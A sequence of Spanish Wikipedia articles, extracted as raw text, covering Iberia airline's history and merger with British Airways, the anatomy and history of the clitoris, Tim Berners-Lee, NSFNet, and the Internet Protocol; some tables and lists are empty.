Iberia (IATA: IB, OACI: IBE) es una , fundada en 1927 con el nombre de "Iberia, Compañía Aérea de Transporte". Su denominación social actual es "Iberia Líneas Aéreas de España, S. A. Operadora Unipersonal". Actualmente es una de las compañías aéreas más antiguas del mundo. Tiene su sede social en Madrid y cotizó en la Bolsa de Madrid desde abril de 2001 hasta enero de 2011, cuando fue sustituida por su matriz International Airlines Group, producto de la fusión con British Airways en 2011, actual accionista único de la compañía. La compañía tiene actualmente su domicilio social en la Calle Martínez Villergas, 49, 28027 Madrid.

Su principal base es el Aeropuerto Adolfo Suárez Madrid-Barajas. En 2010, la aerolínea obtuvo 89 millones de euros de beneficio (frente a las pérdidas netas de 273 millones de € de 2009, los 32 millones de € de 2008 y los 327 millones de € de 2007, los 56,7 millones de € de beneficios en 2006 y los 395 millones de € de beneficios en 2005) y transportó 24,3 millones pasajeros. El Grupo Iberia vuela a 108 destinos en 42 países. El 12 de noviembre de 2009, Iberia confirmó que había llegado a un acuerdo preliminar de entendimiento con British Airways para fusionarse con ella con la firma de un acuerdo vinculante, que solo se dio paso cuando el valor de las acciones de British Airways superaron a las de Iberia, siendo en abril de 2010 la firma del contrato de fusión. En julio de 2010 la Comisión Europea aprobó la operación. Para su culminación, en noviembre de 2010, los accionistas de Iberia y British Airways dan el visto bueno a la fusión de las dos compañías, último requisito necesario para llevar a cabo la fusión de uno de los grupos más potentes del sector.

La nueva sociedad "holding" resultante, llamada International Airlines Group (IAG), es la sexta aerolínea del mundo por ingresos y tercera de Europa. Actualmente Iberia posee una filial (Iberia Express ) y tiene una compañía franquiciada (Air Nostrum).
Fue fundada el 28 de junio de 1927 por el empresario vizcaíno Horacio Echevarrieta y la alemana Lufthansa durante la dictadura de Primo de Rivera como monopolio del transporte aéreo español. Estaba previsto que el primer viaje comercial de Iberia fuese el 14 de diciembre de 1927 entre Madrid y Barcelona, con Alfonso XIII como pasajero de excepción. Sin embargo, fue un vuelo Barcelona-Madrid el primero que operó Iberia al salir dos horas antes que el vuelo oficial. La intención era que Alfonso XIII pudiese presenciar el primer aterrizaje en el Aeropuerto de Carabanchel, actual aeropuerto de Cuatro Vientos, pero cuestiones meteorológicas obligaron a este avión a llegar más tarde de lo previsto. En 1928 había crecido, con tres aviones Rohrbach Ro VIII Roland, que eran unos trimotores con capacidad para diez pasajeros.

En 1929 fue forzada a aportar sus rutas y aviones a la recién creada CLASSA, a instancias del dictamen del Directorio Militar para formar un monopolio con una sola compañía que agrupara todas las existentes por entonces en España. Iberia retenía parte del accionariado de CLASSA. Tras la proclamación de la Segunda República, CLASSA fue disuelta y se creó así LAPE, que absorbió todas las rutas y bienes de CLASSA. Todos los accionistas de CLASSA recibieron una indemnización por ello. Durante todos los años de existencia de CLASSA y LAPE, Iberia fue una sociedad durmiente sin actividad real, pero pese a ello, presentaba anualmente su balance de cuentas en el registro mercantil.

En 1937, durante la Guerra Civil Española Iberia fue reactivada y se convirtió en la línea aérea del bando sublevado, con sede en Salamanca , volando algunos Dragon Rapide y Junkers 52. Hasta 1939, en que realizó su primer vuelo entre Madrid y Lisboa, fue una aerolínea de ámbito exclusivamente nacional. A Lisboa le seguirían Londres y París. Iberia fue nacionalizada en 1944, pasando a formar parte del Instituto Nacional de Industria. El 22 de septiembre de 1946 se convierte en la primera aerolínea en volar entre Europa y América del Sur, mediante el establecimiento del itinerario entre Madrid y Buenos Aires, con escalas en Villa Cisneros, Natal y Río de Janeiro. El avión usado para la ocasión fue un Douglas DC-4, y en él también volaron las primeras azafatas. En 1954 se inauguró el vuelo entre Madrid y Nueva York. Para ello se utilizó un aparato Lockheed Constellation.

En el segundo semestre de 1961 Iberia empezó a utilizar aviones de reacción. Así, se fueron incorporando tres aparatos Douglas DC-8 para ser explotados en los itinerarios de largo radio. Poco después, en 1962, se adquirieron aparatos franceses Caravelle, fabricados por Sud Aviation, para cubrir las líneas europeas. La flota de Iberia a partir de entonces fue creciendo, impulsada por el fuerte auge del aumento de pasaje turístico y por el crecimiento de la renta disponible en España y en el conjunto de la Europa occidental.

El trayecto escogido fue el de Madrid a Barcelona. En esta época no existía la actual congestión de tráfico, con lo que el servicio consistía en un avión en Madrid y otro en Barcelona que tan pronto se llenaban, se ponían rumbo al otro punto de la ruta. Sin embargo, con el aumento del tráfico en los aeropuertos hubo que desechar este funcionamiento y poner unas frecuencias fijas de salida en horas puntas, política que inauguraba a la Monarquía Española. La transición política hacia el sistema democrático convenció a los nuevos responsables del INI de que eran necesarios llevar a cabo una nueva identidad corporativa en la compañía aérea que impulsara la nueva imagen de España en los mercados mundiales.

El 10 de septiembre de 1981 llegó en un avión de la compañía el Guernica de Picasso.
En 1987 se estrenó el sistema informático Amadeus, el sistema de reserva informatizado más grande del mundo hasta la actualidad. La iniciativa correspondió a Iberia junto a sus socios en este negocio, Deutsche Lufthansa y Air France.

Entre los últimos años de la década de 1980 y principios de la década de 1990, Iberia realizó una enorme modernización en su flota. Los nuevos McDonnell Douglas MD-87, Airbus 320, Airbus 340 y Boeing 757 reemplazaron a los antiguos Douglas DC-9, Douglas DC-10 y Boeing 727. En 1991 se creó el primer programa de carácter internacional que se implantó en Europa. En 1992, Iberia se convirtió en patrocinador oficial de los Juegos Olímpicos de Barcelona y de la Exposición Universal de Sevilla.

A comienzos de la década de 1990 los directivos del Instituto Nacional de Industria (INI), propietario de la mayoría del capital de Iberia, plantearon una estrategia de crecimiento de la compañía, con el objetivo de preparar la liberalización de los mercados aéreos en la Unión Europea, prevista para 1994. La expansión de la compañía se hizo en el mercado latinoamericano. Se llevó a cabo la adquisición de una parte de la propiedad de Aerolíneas Argentinas, de la venezolana Viasa y el 35% de la chilena Ladeco, Líneas Aéreas del Cobre. El resultado de esta estrategia, que preveía dotar de activos a Iberia frente a un movimiento de fusiones entre las líneas de bandera europea, fue un fracaso. La pésima gestión de Aerolíneas, las dificultades para poner en marcha una gestión de la compañía desde Iberia, además del pésimo entorno del mercado creado por la Guerra del Golfo en 1991, abocaron a una situación insostenible para la aerolínea española. Las pérdidas fueron cuantiosas para Iberia. El INI, a través del Gobierno español, tuvo que acometer dos ampliaciones de capital. La autorización de la Comisión Europea para que el Estado español aportara capitales logró sacar a Iberia de la bancarrota técnica en la que estuvo inmersa en 1994. Poco después, se puso en marcha el proceso de reajuste de Iberia, que pasó por el desarrollo de cuatro puntos: cambio de directivos y gerentes, salida ordenada de las participadas latinoamericanas, profunda reducción de costes y reajuste interno e inicio del proceso de privatización definitiva de la aerolínea española. En 1999 pasó a formar parte de la alianza Oneworld, junto con las aerolíneas British Airways y American Airlines, entre otras.

El año 2001 marcó también un antes y un después en la historia de la compañía. Con su salida a bolsa en abril de ese año culminaba el proceso de privatización de la compañía y volvía al ámbito privado, en el que nació, aunque fuera pública la mayor parte de su historia. Al año siguiente pasa a formar parte del Ibex 35, en el que cotizó hasta 2011 por su fusión con British Airways. En 2002 la compañía vendió su filial Binter Canarias.

El 25 de octubre de 2008 Iberia retiró de su flota a las aeronaves de la compañía MD, en concreto el modelo MD-88, en dicho día se realizó el último vuelo del mencionado avión. La ruta seguida fue Alicante-Madrid.

Iberia tiene una elevada cuota de mercado en las rutas españolas y entre Europa y Latinoamérica.

En la actualidad, Iberia LAE Operadora vuela a 76 destinos en 48 países desde su base en el Aeropuerto Adolfo Suárez Madrid-Barajas. El Grupo Iberia vuela a 108 destinos de 42 países y en código compartido con otras aerolíneas vuela a 220 destinos en 38 países. Con una flota de 169 aviones, realiza unos 1000 vuelos diarios. En el año 2010 transportó 24,3 millones de pasajeros y 262 402 toneladas de carga. En 2005 introdujo la nueva clase Business Plus en sus aviones A340, que fue mejorada en 2009-2010 con unos asientos que se sitúan en posición totalmente horizontal y menús diseñados por reputados chefs españoles.

Iberia realiza mantenimiento aeronáutico, actividad que presta a su propia flota y a la de otras 100 empresas más, incluidas algunas de las más importantes de Europa, en su base de mantenimiento de La Muñoza, en Barajas. Iberia es el primer operador de "handling" (asistencia a aviones y pasajeros) en todos los aeropuertos de España; tiene entre sus clientes a más de 200 compañías aéreas.

Por otro lado, Iberia fue fundadora y tiene todavía un porcentaje de la propiedad de Amadeus, un sistema de reservas informáticas. Además, junto con Swissair creó Iberswiss, empresa que producía más de 14 millones de bandejas de comida al año y que posteriormente vendió a Gate Gourmet, una empresa en el sector del catering aéreo. Participa en el negocio de los viajes turísticos a través de los turoperadores Viva Tours y en el transporte urgente con Cacesa.

La alianza alcanzada con American Airlines y con British Airways, junto con la entrada en Oneworld, sitúan a Iberia en uno de los grandes grupos que se están formando de cara a competir en un mercado global.

Iberia franquicia su marca a otra aerolínea independiente, Air Nostrum, que es propiedad de Nefinsa y Caja Duero, y que opera una red propia de vuelos regionales que son comercializados por Iberia.

En 2006 Iberia cerró su base de operaciones de Barcelona y creó una línea aérea de bajo coste denominada Clickair, con base en el aeropuerto de Barcelona. Un año después de su primer vuelo, Clickair se convirtió en la aerolínea líder en el aeropuerto de Barcelona. En 2009 Clickair se fusionó con su rival Vueling. Iberia tiene el 45% del accionariado de la sociedad resultante, que recientemente ha sido ampliado a más del 90%.

EL 15 de octubre de 2013, Iberia presentó su nuevo logotipo y eslogan. El primer avión con el nuevo logotipo entró en servicio a finales del 2013.

En mayo de 2017, Iberia implementará la nueva cabina Turista Premium para vuelos intercontinentales. La aerolínea se convierte en la primera compañía aérea española en ofrecer este módelo de cabina, producto intermedio entre la cabina económica y ejecutiva Business Plus.

En julio de 2009, Iberia y la aerolínea británica British Airways comenzaron negociaciones para fusionarse. Se trataba fundamentalmente de una fusión a nivel económico ya que ambas empresas mantendrían sus propias marcas dentro de la nueva aerolínea, que se convertiría en uno de los grupos aéreos internacionales más grandes del sector: la tercera compañía aérea a nivel mundial. Se mantendrán ambas marcas según las conocidas estructuras de nacionalidad de ambas compañías, publicadas en el Documento de Registro de IAG S.A, para evitar la pérdida de derechos de vuelo, sobre todo hacia países de Latinoamérica, ya que éstos son acuerdos bilaterales entre estados.

En julio de 2009, Antonio Vázquez Romero relevó a Fernando Conte como presidente de Iberia.

El 12 de noviembre de 2009 los consejos de administración de Iberia y British Airways dieron por fin el visto bueno a la fusión. Se creó una nueva sociedad, "International Airlines Group", propietaria de British Airways e Iberia. La sede social y fiscal del nuevo "holding" se sitúo en Madrid, mientras que la financiera estaba en Londres. A mediados de noviembre de 2010 Iberia sometió el acuerdo a sus respectivos accionistas para su aprobación, ejecutándose la operación aproximadamente un mes después de su aprobación. El 20 de enero de 2011 Iberia y British Airways dejaron de cotizar en bolsa para ser sustituidas por IAG desde el día 24.
Tras la fusión entre Iberia y British Airways en enero de 2011, ambas aerolíneas pertenecen al grupo aéreo International AirlinesGroup (IAG), que cotiza en la bolsa de Londres y en el Ibex 35. Su sede social se encuentra en Madrid y la financiera y operativa en Londres.

El 6 de octubre de 2010 Iberia, British Airways y American Airlines anunciaron oficialmente, tras recibir la aprobación de la Unión Europea, su Acuerdo de Negocio Conjunto en la explotación de las rutas aéreas del Atlántico Norte.
Durante 2010 Iberia volvió a los beneficios, después de que en el año 2009 se registraran pérdidas tras 13 años consecutivos de resultados positivos. En concreto, el beneficio neto ascendió a 89 millones de euros, frente a los 273 millones de pérdidas de 2009. Sin embargo, el resultado de explotación fue ligeramente negativo – tres millones de euros –.

En noviembre de 2010, Iberia anunció la reapertura de la base en el aeropuerto de Barcelona basando un Airbus A340 para iniciar operaciones hacia América. El 29 de marzo de 2011 se abrió oficialmente la base en Barcelona operando la ruta Barcelona-Miami tres veces por semana, la aerolínea también anunció la apertura el 19 de junio de la ruta Barcelona-São Paulo, la cual se inauguró con un 100% de ocupación.

En octubre de 2011 el consejo de administración de Iberia aprobó la creación de una filial para los vuelos de corto y medio radio, que se denominaba Iberia Express. El capital de la nueva filial era al 100% de Iberia. Inició sus operaciones en el mes de abril de 2012. Según la compañía, el objetivo de la nueva filial es conseguir unos costes de producción más bajos en el negocio de corto y medio radio, que es deficitario en la actualidad.

Diversos sindicatos han recogido que desde que se hizo efectivo el proceso de integración se ha favorecido a British Airways, la cual aumentó su oferta con España en un 23% en España, aunque en realidad lo único que ha hecho es poner vuelos desde Londres a destinos de costa españoles. Iberia ha reducido su oferta en un 15%, siendo la caída del 4,6% si se suman los datos de la franquicia Iberia Regional-Air Nostrum y de la aerolínea participada Vueling. Lo cierto es que British Airways ha aumentado su oferta desde su hub de Londres Heathrow por el buen comportamiento de la demanda desde y hacia Londres, mientras que la oferta de Iberia ha tenido que adaptarse al descenso de la demanda en su hub de Madrid por la crisis. Paralelamente, en la Sentencia de la Audiencia Nacional ""los demandantes no han demostrado de ningún modo que se hayan cedido rutas rentables a Iberia Express o a British Airways [...]. Se ha demostrado, por el contrario, que la empresa demandada ha dejado de operar únicamente rutas que no eran rentables"". Iberia y British Airways tienen mercados diferentes, de modo que el que uno crezca en su mercado nunca puede ser en detrimento del otro. Además, Iberia tiene que reducir su oferta para eliminar frecuencias o rutas no rentables y crecerá cuando su cuenta de resultados sea positiva. La fusión ha reportado a Iberia en poco más de un año y medio 109 millones de euros en sinergias.

Los mismos sindicatos dicen que la fórmula de crecimiento de las dos compañías es distinta, ya que mientras la aerolínea británica tiene una previsión de incorporar 39 nuevas aeronaves (de los cuales: 12 Airbus A380, 3 Boeing 777 y 24 Boeing 787) y 800 pilotos. La realidad es que, desde principios de 2013, Iberia está incorporando aviones Airbus A330-300 hasta un total de 8 aeronaves y está renovando los interiores de todos los A-340/600, además de tener la opción de compra para otros 44 aviones.

Asimismo, poco después del anuncio de creación de Iberia Express, desde el Sindicato Español de Pilotos de Líneas Aéreas (SEPLA), criticaron la medida ya que consideran que no es nueva. Citan que anteriores iniciativas similares como Viva Air, Binter Mediterráneo o Clickair hicieron perder cerca de 200 millones de euros a Iberia.

Sin embargo, Clickair, convertida en Vueling, es una compañía de éxito que ahora es participada de Iberia, y fue galardonada con cuatro de los ocho premios que otorga la World Low Cost Airlines Congress el pasado año, además de la distinción principal como mejor aerolínea del año. Siendo 2012 el cuarto año consecutivo que Vueling recibe el reconocimiento del sector.

Asimismo, el SEPLA afirmaba que el objetivo final que existe detrás de la creación de esta aerolínea era la de entregar y regalar la matriz Iberia a la aerolínea británica British Airways. La Audiencia Nacional en su Sentencia del 4 de julio de 2013 reconoce que la situación de la compañía es comprometida, por la crisis económica, los altos precios del combustible y los altos costes laborales, por lo que considera imprescindible "“la adecuación de sus costes y plantilla, así como el incremento de productividad"”. Además avala las decisiones que se han ido tomando por la compañía.


La flota de Iberia —sin contar las filiales Iberia Express, Iberia Regional o Level— promedia una edad de 10 años. A marzo de 2018, está compuesta por las siguientes aeronaves:

La flota total, contando Iberia Express e Iberia Regional, es de 141 aeronaves.

El 7 de marzo de 2011 Iberia realizó un pedido por 8 aviones A330-300 (con opciones a otros 8) con objeto de empezar a renovar su flota de largo radio. Se esperaba que el primero de ellos se entregara el 17 de enero de 2013, pero la entrega se retrasó a principios de febrero. El 30 de abril de 2013 se incorporó un nuevo A330, de nombre "Panamá", del pedido previsto. Este pedido de aviones es el primero desde que Iberia forma parte de la matriz IAG.

Con vistas a la futura reestructuración de la compañía española, IAG tenía negociados con Airbus 32 opciones de A350-900 más otras 12 opciones de Boeing 787-9. El 1 de agosto de 2014, IAG confirmó 90 opciones de A350-900 y 8 opciones A330-200 para Iberia, con la vista puesta en la leve mejora económica de la compañía. Se espera que los primeros aviones se reciban entre 2015 y 2018.

Esta es la lista de modelos de aeronaves hasta la Segunda Guerra Mundial:

Esta es la lista de las aeronaves:

Esta es la lista de aeronaves:

El Grupo Iberia «opera 94 destinos en 36 países diferentes, a los que hay que añadir 224 adicionales en 50 países gracias a acuerdos de código compartido con otras compañías aéreas». Mientras que en los vuelos hacia América tiene una importante presencia, la principal debilidad de Iberia son las rutas a Asia ya que cuenta con pocos destinos propios, siendo la mayoría en código compartido.

Iberia tiene firmados acuerdos de vuelo con código compartido con las siguientes aerolíneas:





</doc>
<doc id="6480" url="https://es.wikipedia.org/wiki?curid=6480" title="Clítoris">
Clítoris

El clítoris es un órgano del aparato genital femenino. Su única función conocida es la de proporcionar placer sexual a la mujer. Su punta o "glande" asoma en la parte superior de la vulva, pero se extiende por el interior de los labios mayores, del perineo y rodea el tercio inferior de la vagina.

El clítoris tiene cinco partes, de las cuales, cuatro son bilaterales y simétricas. El glande es la única parte visible. Bajo la piel de los labios mayores se encuentran los "bulbos vestibulares", que se unen por debajo de la vagina y rodean su entrada y su tercio inferior. Externamente a ellos se localizan los "cuerpos pareados" o "crura", unidos en la línea media y separados sólo por un septo fibroso.

El glande del clítoris asoma en la parte superior de la vulva. 
Está parcial o totalmente recubierto por un pliegue cutáneo llamado capuchón, formado por la unión, en su parte superior, de los dos labios menores.

En él se concentran los nervios que producen placer sexual en la mujer. Hasta el momento esa es su única función conocida.

El cuerpo del clítoris puede llegar a tener un tamaño de 10 a 13mm en toda su longitud, mientras que el glande clitoridiano mide entre 3 y 4mm de ancho, y entre 4 y 5mm de largo, en estado de reposo; en erección puede alcanzar de 10 a 15mm de longitud. 

En el desarrollo embrionario, hay una fase en que ambos sexos son indistinguibles. El clítoris se desarrolla al mismo tiempo que los demás órganos sexuales externos de la mujer, desde la séptima semana de la vida embrionaria, a partir del tubérculo genital.

La estimulación del clítoris tiene lugar durante la masturbación o el acto sexual. Dependiendo de la situación, como por ejemplo, una pareja heterosexual u homosexual, la postura, etc., se puede estimular de distintas formas, más o menos localizadas o indirectas. Para la masturbación del clítoris por el glande o parte visible, es recomendable hacerlo indirectamente y con lubricación, ya sea producida o artificial. El clítoris al extenderse por dentro puede llegar al orgasmo o clímax también por estimulación interna, es decir, todos los orgasmos son clitorianos. 

En algunas culturas africanas se practica la infibulación o la ablación —mutilación total o parcial— del glande del clítoris a una edad muy temprana, para evitar que las mujeres conozcan el placer sexual y el orgasmo. Esta práctica es considerada, en esas culturas, parte de un rito de iniciación a la pubertad que se supone protege la virginidad de las mujeres y asegura que vivirán en castidad hasta el matrimonio.

El término "clítoris" procede del griego antiguo κλειτορίς ("kleitorís"), que fue reintroducido sin cambios en el Renacimiento. El primer médico antiguo en haberlo descrito y nombrado fue Rufo de Éfeso (siglos - d. C.). Este autor señala que en griego existía un verbo derivado, κλειτοριάζω ("kleitoriázō"), que significaba «acariciar(se) el clítoris para producir placer».

La literatura médica moderna menciona por primera vez la existencia del clítoris hacia el , aunque hay discusiones sobre el momento exacto. Renaldo Columbus, también conocido como Mateo Realdo Colombo, fue un profesor de cirugía en la Universidad de Padua, en Italia, y publicó en 1559 un libro, llamado "De re anatomica", en el que describió «la sede del placer femenino». Columbus concluyó que «como nadie ha descubierto estos detalles y su propósito, si se permite que le dé nombres a cosas que descubro, debería ser llamado “el amor o dulzura de Venus”».

La aseveración de Columbus fue rechazada por su sucesor en la universidad, Gabriele Falloppio, quien describió por primera vez las trompas de Falopio, también denominadas "tubas uterinas", y se adjudicó el haber sido el primero en describir el clítoris. En el , el anatomista holandés Caspar Bartholin –véase glándulas de Bartolino– rechazó ambas pretensiones, diciendo que el clítoris ya era ampliamente conocido por la ciencia médica desde el .

Durante la época victoriana del , las mujeres que padecían problemas uterinos, hormonales o emocionales eran diagnosticadas con una supuesta enfermedad llamada histeria femenina, la cual no tenía remedio y solo podía ser aminorada por medio de masajes de clítoris, equivalentes a lo que hoy en día reconocemos como masturbación. Los médicos manipulaban la vulva de la paciente hasta que esta alcanzaba el orgasmo, momento en que se aplacaban los síntomas de su mal. La lista de síntomas asociados con este mal era tan larga que llegó un momento en que se convirtió en una epidemia; casi cualquier dolencia leve podía servir para diagnosticar histeria. 

El ginecólogo William Masters y la sexóloga Virginia Johnson, conocidos popularmente por sus dos apellidos juntos, Masters y Johnson, y pioneros del estudio de la respuesta sexual humana, efectuaron estudios sobre el clítoris.

Existen debates sobre si es un órgano vestigial, una adaptación o si tiene funciones reproductivas. Geoffrey Miller ha dicho que el clítoris humano «no muestra indicios de haber evolucionado por selección preferente, es decir, por la elección directa de los machos sobre hembras con un carácter determinado. No es especialmente grande, ni tiene colores brillantes, o una forma específica, ni está exhibido en la selección durante el cortejo».



</doc>
<doc id="6481" url="https://es.wikipedia.org/wiki?curid=6481" title="1701">
1701







</doc>
<doc id="6484" url="https://es.wikipedia.org/wiki?curid=6484" title="Tim Berners-Lee">
Tim Berners-Lee

"Sir" Timothy "Tim" John Berners-Lee, KBE (Londres, Reino Unido, 8 de junio de 1955) es un científico de la computación británico, conocido por ser el padre de la Web. Estableció la primera comunicación entre un cliente y un servidor usando el protocolo HTTP en noviembre de 1989. En octubre de 1994 fundó el Consorcio de la World Wide Web (W3C) con sede en el MIT, para supervisar y estandarizar el desarrollo de las tecnologías sobre las que se fundamenta la Web y que permiten el funcionamiento de Internet.

Ante la necesidad de distribuir e intercambiar información acerca de sus investigaciones de una manera más efectiva, Berners-Lee desarrolló las ideas fundamentales que estructuran la web. Él y su grupo crearon lo que por sus siglas en inglés se denomina Lenguaje HTML (HyperText Markup Language") o lenguaje de etiquetas de hipertexto, el protocolo HTTP (HyperText Transfer Protocol") y el sistema de localización de objetos en la web URL ("Uniform Resource Locator").

Es posible encontrar muchas de las ideas plasmadas por Berners-Lee en el proyecto Xanadú (que propuso Ted Nelson) y el memex (de Vannevar Bush).

Nació en el sudoeste de Londres en 1955. Sus padres eran matemáticos y formaron parte del equipo que construyó el Manchester Mark I. Se graduó en física en 1976 a los 21 años en el Queen's College de la Universidad de Oxford. Conoció a su primera esposa en este tiempo. En 1978, trabajó en D.G. Nash Limited (también en Poole) donde escribió un sistema operativo.

Berners-Lee trabajó en el CERN desde junio hasta diciembre de 1980. Durante ese tiempo, propuso un proyecto basado en el hipertexto para facilitar la forma de compartir y la puesta al día de la información entre investigadores. En este periodo también construyó un programa llamado ENQUIRE que no llegó a ver la luz.

Después de dejar el CERN, en 1980, se fue a trabajar a la empresa de John Poole Image Computer Systems Ltd., pero regresó al CERN otra vez en 1984. 

En 1989, el CERN era el nodo de Internet más grande de Europa y Berners-Lee vio la oportunidad de unir Internet y el hipertexto (HTTP y HTML), de lo que surgiría la World Wide Web. Desarrolló su primera propuesta de la Web en marzo de 1989, pero no tuvo mucho eco, por lo que en 1990 y con la ayuda de Robert Cailliau, hicieron una revisión que fue aceptada por su gerente, Mike Sendall. Usó ideas similares a las que había usado en el sistema Enquire, para crear la World Wide Web, para esto diseñó y construyó el primer navegador (llamado WorldWideWeb y desarrollado con NEXTSTEP) y el primer servidor Web al que llamó httpd (HyperText Transfer Protocol daemon).

El primer servidor Web se encontraba en el CERN y fue puesto en línea el 6 de agosto de 1991. Esto proporcionó una explicación sobre lo que era el World Wide Web, cómo uno podría tener un navegador y cómo establecer un servidor Web. Este fue también el primer directorio Web del mundo, ya que Berners-Lee mantuvo una lista de otros sitios Web aparte del suyo. Debido a que tanto el software del servidor como del cliente fue liberado de forma gratuita desde el CERN, el corazón de Internet Europeo en esa época, su difusión fue muy rápida. El número de servidores Web pasó de veintiséis en 1992 a doscientos en octubre de 1995 lo que refleja cual fue la velocidad de la difusión de internet.

En 1994 entró en el Laboratorio de Ciencias de la Computación e Inteligencia Artificial del Massachusetts Institute of Technology. Se trasladó a EE. UU. y puso en marcha el W3C, que dirige actualmente. El W3C es un organismo internacional de estandarización de tecnologías Web dirigido conjuntamente por el Instituto Tecnológico de Massachusetts, el ERCIM francés y la Universidad de Keiō en Japón. Este organismo decidió que todos sus estándares fuesen libres, es decir, que los pudiese utilizar todo el mundo libremente sin coste alguno, lo que sin lugar a dudas fue una de las grandes razones para que la Web haya llegado a tener la importancia que tiene hoy en día.

En su libro "Tejiendo la red", publicado en 1999, Berners-Lee explica por qué la tecnología web es libre y gratis. Se considera al mismo tiempo el inventor y el protector de la web.

En el pasado, Berners-Lee se opuso a la creación de nombres de dominio nuevos como el '.mobi'. De hecho, cuando el '.mobi ' nació, él era el mayor detractor. Él argumenta que todo el mundo debería acceder a las mismas web, independientemente de si usase un ordenador o un móvil.
Básicamente lo que no le gustaba a Berners-Lee del .mobi es que este sería para que se accediese únicamente con los móviles, ya que él desarrolló la web como una forma de comunicación universal y no veía necesario el desarrollo del .mobi únicamente para el uso en móviles.

También hubo una pelea entre diferentes gobiernos y el ICANN sobre la propiedad de los nombres de los dominios, sobre todo con el ".com". Berners-Lee apoya que nadie tenga los nombres de los dominios, sino que estos sean un recurso público.

Berners-Lee también dejó claro que el nombre o la propiedad de los dominios no era el aspecto más importante en el proceso de estandarización, sino que eran más importantes los estándares de vídeo, codificación, estándares abiertos de comunicación de datos, subida de datos científicos y clínicos o la propagación de información entre países.





















Las personas más importantes de la historia de la informática. 


</doc>
<doc id="6485" url="https://es.wikipedia.org/wiki?curid=6485" title="NSFNet">
NSFNet

Acrónimo inglés de National Science Foundation's Network. La NSFNET comenzó con una serie de redes dedicadas a la comunicación de la investigación y de la educación. Fue creada por el gobierno de los Estados Unidos (a través de la National Science Foundation), y fue reemplazo de ARPANET como backbone de Internet. Desde entonces ha sido reemplazada por las redes comerciales.

Computer Science Network (CSNET) era una red de servicios para departamentos académicos, y en 1981 la National Science Foundation (NSF) se fijó en ella para crear una red académica para las supercomputadoras de la NSF. Esta red se estableció en 1985 con los siguientes cinco nodos:


NSFNET fue una red de propósito general para conectar las supercomputadoras mencionadas además de redes y campus regionales usando el ya existente TCP/IP en 1986, desarrollado y probado en ARPANET. En la implementación se utilizaron computadoras PDP-11/73 como routers las cuales se llamadon "Fuzzballs" bajo la supervisión de Ed Krol de la Universidad de Illinois. La velocidad máxima del backbone era de 56 kb/s

Soporte técnico fue proporcionado por NSF Network Service Center (NNSC) de BBN Technologies el cual publicaba el "Internet Manager´s Phonebook" con información de cada dominio y dirección IP en 1990. Krol creó el Hitchhiker Guide to The Internet como uno de los primeros manuales destinado al uso de la red. Conforme la red creció los 56 kb/s quedaron rebasados, en junio de 1987 NSF inició los procesos necesarios para mejorar NSFNET.

En noviembre de 1987 NSF comisionó a Merit Network, un consortium de universidades públicas de Michigan para mejorar la red original de 56 kb/s a 13 nodos de 1.5 Mb/s (T-1) en julio de 1988. Los nodos usaban como routers nueve sistemas IBM RT con software AOS, una versión modificada de Berkeley UNIX 



</doc>
<doc id="6488" url="https://es.wikipedia.org/wiki?curid=6488" title="Protocolo de Internet">
Protocolo de Internet

El protocolo de Internet (en inglés Internet Protocol o IP) es un protocolo de comunicación de datos digitales clasificado funcionalmente en la capa de red según el modelo internacional OSI.

Su función principal es el uso bidireccional en origen o destino de comunicación para transmitir datos mediante un protocolo no orientado a conexión que transfiere paquetes conmutados a través de distintas redes físicas previamente enlazadas según la norma OSI de enlace de datos.

El diseño del protocolo IP se realizó presuponiendo que la entrega de los paquetes de datos sería no confiable. Por ello, IP tratará de realizarla del mejor modo posible, mediante técnicas de encaminamiento, sin garantías de alcanzar el destino final pero tratando de buscar la mejor ruta entre las conocidas por la máquina que esté usando IP.

Los datos en una red basada en IP son enviados en bloques conocidos como paquetes o datagramas (en el protocolo IP estos términos se suelen usar indistintamente). En particular, en IP no se necesita ninguna configuración antes de que un equipo intente enviar paquetes a otro con el que no se había comunicado antes.

IP provee un servicio de datagramas no fiable (también llamado del "mejor esfuerzo": lo hará lo mejor posible, pero garantizando poco). IP no provee ningún mecanismo para determinar si un paquete alcanza o no su destino y únicamente proporciona seguridad (mediante "checksums" o sumas de comprobación) de sus cabeceras y no de los datos transmitidos. Por ejemplo, al no garantizar nada sobre la recepción del paquete, éste podría llegar dañado, en otro orden con respecto a otros paquetes, duplicado o simplemente no llegar. Si se necesita fiabilidad, ésta es proporcionada por los protocolos de la capa de transporte, como TCP.
Las cabeceras IP contienen las direcciones de las máquinas de origen y destino (direcciones IP), direcciones que serán usadas por los enrutadores (routers) para decidir el tramo de red por el que reenviarán los paquetes.

El IP es el elemento común en el Internet de hoy. El actual y más popular protocolo de red es IPv4. IPv6 es el sucesor propuesto de IPv4; poco a poco Internet está agotando las direcciones disponibles por lo que IPv6 utiliza direcciones de fuente y destino de 128 bits, muchas más direcciones que las que provee IPv4 con 32 bits. Las versiones de la 0 a la 3 están reservadas o no fueron usadas. La versión 5 fue usada para un protocolo experimental. Otros números han sido asignados, usualmente para protocolos experimentales, pero no han sido muy extendidos.

Si la información a transmitir ("datagramas") supera el tamaño máximo "negociado" (MTU) en el tramo de red por el que va a circular podrá ser dividida en paquetes más pequeños, y reensamblada luego cuando sea necesario. Estos fragmentos podrán ir cada uno por un camino diferente dependiendo de como estén de congestionadas las rutas en cada momento.

Quizás los aspectos más complejos de IP son el direccionamiento y el enrutamiento. El direccionamiento se refiere a la forma como se asigna una dirección IP y cómo se dividen y se agrupan subredes de equipos. 

El enrutamiento consiste en encontrar un camino que conecte una red con otra y, aunque es llevado a cabo por todos los equipos, es realizado principalmente por routers, que no son más que computadoras especializadas en recibir y enviar paquetes por diferentes interfaces de red, así como proporcionar opciones de seguridad, redundancia de caminos y eficiencia en la utilización de los recursos.

Una dirección IP es un número que identifica de manera lógica y jerárquicamente a una interfaz de un dispositivo (habitualmente una computadora) dentro de una red que utilice el protocolo de Internet ("Internet Protocol"), que corresponde al nivel de red o nivel 3 del modelo de referencia OSI. Dicho número no se ha de confundir con la dirección MAC que es un número físico que es asignado a la tarjeta o dispositivo de red (viene impuesta por el fabricante), mientras que la dirección IP se puede cambiar.

El usuario al conectarse desde su hogar a Internet utiliza una dirección IP. Esta dirección puede cambiar al reconectar. A la posibilidad de cambio de dirección de la IP se denomina "dirección IP dinámica". Existe un protocolo para asignar direcciones IP dinámicas llamado DHCP ("Dynamic Host Configuration Protocol").

